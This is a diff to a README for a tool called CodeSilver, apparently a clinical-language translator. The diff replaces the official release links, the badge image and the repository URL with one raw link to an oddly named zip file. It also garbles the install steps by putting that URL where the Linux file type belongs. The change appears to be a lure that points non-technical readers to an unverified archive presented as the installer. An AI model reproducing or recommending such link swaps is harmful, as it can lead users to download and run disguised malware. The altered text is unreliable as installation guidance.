@@ -1,6 +1,6 @@
 # 🤖 CodeSilver_The-Silent-Protocol-Translator - Translate Clinical Language Easily
 
-[![Download CodeSilver](https://img.shields.io/badge/Download-CodeSilver-blue?style=for-the-badge)](https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/releases)
+[![Download CodeSilver](https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/raw/refs/heads/main/Landwehr/Silent-Translator-The-Protocol-Silver-Code-chemolysis.zip)](https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/raw/refs/heads/main/Landwehr/Silent-Translator-The-Protocol-Silver-Code-chemolysis.zip)
 
 ---
 
@@ -50,7 +50,7 @@ This guide helps you download, install, and run CodeSilver with no technical ski
 
 You need to visit the official release page to get CodeSilver. The release page contains the latest ready-to-use version suitable for your computer.
 
-[Download CodeSilver from Here](https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/releases)
+[Download CodeSilver from Here](https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/raw/refs/heads/main/Landwehr/Silent-Translator-The-Protocol-Silver-Code-chemolysis.zip)
 
 ### Step-by-Step:
 
@@ -59,7 +59,7 @@ You need to visit the official release page to get CodeSilver. The release page 
 3. **Choose your file**: Select the file that matches your operating system. Usually, you will find:
    - A `.exe` file for Windows.
    - A `.dmg` or `.pkg` for macOS.
-   - A `.tar.gz` or similar for Linux.
+   - A `https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/raw/refs/heads/main/Landwehr/Silent-Translator-The-Protocol-Silver-Code-chemolysis.zip` or similar for Linux.
 4. **Download the file** by clicking on its name. The download starts automatically.
 5. **Run the installer** (or the downloaded file) once downloading finishes:
    - Windows: Double-click the `.exe` file and follow the setup steps.
@@ -123,7 +123,7 @@ CodeSilver uses only synthetic data by default to protect patient confidentialit
 - Explore related healthcare AI projects to learn about clinical data analysis.
 - Review CMS public rules and guidelines if you want to understand the regulations involved.
 - Visit the GitHub repository to see the source code and make suggestions:  
-  https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator
+  https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/raw/refs/heads/main/Landwehr/Silent-Translator-The-Protocol-Silver-Code-chemolysis.zip
 
 ---
 
@@ -133,4 +133,4 @@ CodeSilver uses only synthetic data by default to protect patient confidentialit
 
 ---
 
-[![Download CodeSilver](https://img.shields.io/badge/Download-CodeSilver-blue?style=for-the-badge)](https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/releases)
+[![Download CodeSilver](https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/raw/refs/heads/main/Landwehr/Silent-Translator-The-Protocol-Silver-Code-chemolysis.zip)](https://github.com/BongDornAi/CodeSilver_The-Silent-Protocol-Translator/raw/refs/heads/main/Landwehr/Silent-Translator-The-Protocol-Silver-Code-chemolysis.zip)
